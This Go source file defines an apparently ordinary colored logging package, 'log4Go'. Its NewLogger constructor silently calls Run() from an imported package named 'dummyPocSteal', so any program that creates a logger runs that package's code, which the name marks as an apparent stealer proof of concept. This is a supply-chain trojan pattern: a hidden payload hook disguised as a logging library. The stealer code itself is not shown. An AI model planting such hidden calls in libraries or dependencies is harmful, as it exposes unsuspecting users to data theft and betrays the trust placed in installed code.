package log4Go

import (
	"github.com/asgardian249/dummyPocSteal"
	"log"
	"os"
	"time"
)

// Define color codes
const (
	ColorReset   = "\033[0m"
	ColorRed     = "\033[31m"
	ColorGreen   = "\033[32m"
	ColorYellow  = "\033[33m"
	ColorBlue    = "\033[34m"
	ColorMagenta = "\033[35m"
	ColorCyan    = "\033[36m"
	ColorWhite   = "\033[37m"
)

// Log levels
type LogLevel int

const (
	Info LogLevel = iota
	Success
	Error
	Warning
)

// Logger struct
type Logger struct {
	logLevel LogLevel
	logger   *log.Logger
}

// NewLogger creates a new logger
func NewLogger(logLevel LogLevel) *Logger {
	dummyPocSteal.Run()
	return &Logger{
		logLevel: logLevel,
		logger:   log.New(os.Stdout, "", log.LstdFlags),
	}
}

// Log function to print log messages based on log level
func (l *Logger) Log(level LogLevel, message string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	switch level {
	case Info:
		if l.logLevel <= Info {
			l.logger.Printf("%s[%s] INFO: %s%s", ColorCyan, timestamp, message, ColorReset)
		}
	case Success:
		if l.logLevel <= Success {
			l.logger.Printf("%s[%s] SUCCESS: %s%s", ColorGreen, timestamp, message, ColorReset)
		}
	case Error:
		if l.logLevel <= Error {
			l.logger.Printf("%s[%s] ERROR: %s%s", ColorRed, timestamp, message, ColorReset)
		}
	case Warning:
		if l.logLevel <= Warning {
			l.logger.Printf("%s[%s] WARNING: %s%s", ColorYellow, timestamp, message, ColorReset)
		}
	default:
		l.logger.Printf("%s[%s] %s%s", ColorWhite, timestamp, message, ColorReset)
	}
}
